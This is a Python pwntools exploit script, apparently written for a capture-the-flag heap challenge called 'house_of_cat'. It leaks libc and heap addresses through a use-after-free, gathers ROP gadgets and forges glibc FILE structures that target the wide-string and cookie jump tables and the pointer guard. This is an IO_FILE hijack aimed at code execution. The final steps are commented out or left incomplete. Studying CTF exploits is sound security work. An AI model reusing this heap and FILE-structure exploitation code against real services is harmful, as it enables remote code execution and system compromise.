# -*- encoding: utf-8 -*-
import sys 
import os 
import requests
from pwn import * 
binary = './house_of_cat'
os.system('chmod +x %s'%binary)
context.update( os = 'linux', arch = 'amd64',timeout = 1)
context.binary = binary
context.log_level = 'debug'
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
DEBUG = 1
if DEBUG:
    libc = elf.libc
    p = process(binary)
    # p = process(['qemu-arm', binary])
else:
    host = ''
    port = ''
    p = remote(host,port)

l64 = lambda            : ras(u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')))
l32 = lambda            : ras(u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00')))
uu64= lambda a          : ras(u64(p.recv(a).ljust(8,'\x00')))
uu32= lambda a          : ras(u32(p.recv(a).ljust(4,'\x00')))
rint= lambda x = 12     : ras(int( p.recv(x) , 16))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))

def ras( data ):
    lg('leak' , data)
    return data

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def one_gadget(filename):
    log.success('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('choice:',num)

def add(idx , size , text = 'niyah' ):
    if (text == 'niyah'):
        text = flat(0,0x21)*(size/0x10)
    sa('mew~~~~~~\n' , 'CAT | r00t QWBQWXF $' + p32(0xFFFFFFFF))
    cmd(1)
    sla('idx:' , idx)
    sla('size:' , size)
    sa('content:' , text)

def edit(idx , text):
    sa('mew~~~~~~\n' , 'CAT | r00t QWBQWXF $' + p32(0xFFFFFFFF))
    cmd(4)
    sla('idx:' , idx)
    sa('content:' , text)

def show(idx ):
    sa('mew~~~~~~\n' , 'CAT | r00t QWBQWXF $' + p32(0xFFFFFFFF))
    cmd(3)
    sla('idx:' , idx)

def delete(idx ):
    sa('mew~~~~~~\n' , 'CAT | r00t QWBQWXF $' + p32(0xFFFFFFFF))
    cmd(2)
    sla('idx:' , idx)

def pack_file(_flags = 0,
    _IO_read_ptr = 0,
    _IO_read_end = 0,
    _IO_read_base = 0,
    _IO_write_base = 0,
    _IO_write_ptr = 0,
    _IO_write_end = 0,
    _IO_buf_base = 0,
    _IO_buf_end = 0,
    _IO_save_base = 0,
    _IO_backup_base = 0,
    _IO_save_end = 0,
    _IO_marker = 0,
    _IO_chain = 0,
    _fileno = 0,
    _flags2 = 0,
    _lock = 0,
    _wide_data = 0,
    _mode = 0):
    file_struct = p32(_flags) + \
        p32(0) + \
        p64(_IO_read_ptr) + \
        p64(_IO_read_end) + \
        p64(_IO_read_base) + \
        p64(_IO_write_base) + \
        p64(_IO_write_ptr) + \
        p64(_IO_write_end) + \
        p64(_IO_buf_base) + \
        p64(_IO_buf_end) + \
        p64(_IO_save_base) + \
        p64(_IO_backup_base) + \
        p64(_IO_save_end) + \
        p64(_IO_marker) + \
        p64(_IO_chain) + \
        p32(_fileno) + \
        p32(_flags2)
    file_struct = file_struct.ljust(0x88, '\x00')
    file_struct += p64(_lock)
    file_struct = file_struct.ljust(0xa0, '\x00')
    file_struct += p64(_wide_data)
    file_struct = file_struct.ljust(0xc0, '\x00')
    file_struct += p64(_mode)
    file_struct = file_struct.ljust(0xd8, '\x00')
    return file_struct

# one_gad = one_gadget(libc.path)

def attack():
    
    payload = 'LOGIN | r00t QWBQWXF admin'
    sa('mew~~~~~~\n' , payload)

    add(0 , 0x418 )
    add(1 , 0x428 )
    add(2 , 0x438 )
    add(3 , 0x428 )
    delete(2)
    add(4 , 0x448)
    show(2)
    
    libc.address = l64() - 0x21a0d0
    libc_base = libc.address
    l64()
    p.recv(2)
    heap_base = uu64(6) - 0x290
    
    pop_rdi_addr = libc.search(asm('pop rdi;ret')).next()
    pop_rsi_addr = libc.search(asm('pop rsi;ret')).next()
    pop_rax_addr = libc.search(asm('pop rax;ret')).next()
    syscall_addr = libc.search(asm('syscall;ret')).next()
    IO_list_all = libc.symbols['_IO_list_all']
    _IO_wstrn_jumps = libc_base + 0x215dc0
    _IO_cookie_jumps = libc_base + 0x215b80
    point_guard_addr = libc_base - 0x2890
    chain = heap_base + 0x10a0
    
    lg('libc.address' , libc.address)
    lg('point_guard_addr' , point_guard_addr)
    lg('chain' , chain)
    
    delete(1)
    add(5 , 0x438 , '\x00'*0x428 + p64(0x431) + flat(0,0x21))
    add(6 , 0x428)
    delete(2)
    
    # delete(3)
    # delete(1)
    
    # delete(0)
    # edit(2 , flat(libc_base + 0x21a0d0 ,libc_base + 0x21a0d0,heap_base+0x290,IO_list_all - 0x20 ))
    # add(5,0x438)
    
    file1 = pack_file(
        _IO_write_ptr = 0xffffffffffffffff,
        _IO_chain = chain,
        _flags2 = 8,
        _wide_data = point_guard_addr,
    ) + p64(_IO_wstrn_jumps)
    
    file2 = pack_file(
        _IO_write_base = 0,
        _IO_write_ptr = 1,
        _flags2 = 8,
    ) + p64(_IO_cookie_jumps + 0x58)
    
    # add(6 , 0x418)
    # delete(2)
    
    # edit(2 , flat(libc_base + 0x21a0d0 ,libc_base + 0x21a0d0,heap_base+0x290,heap_base+0x290 ))
    # delete(3)
    
    
    dbg()
    
    # p.success(getShell())
    p.interactive()

attack()

'''
@File    :   house_of_cat.py
@Time    :   2022/07/30 10:26:41
@Author  :   Niyah 
'''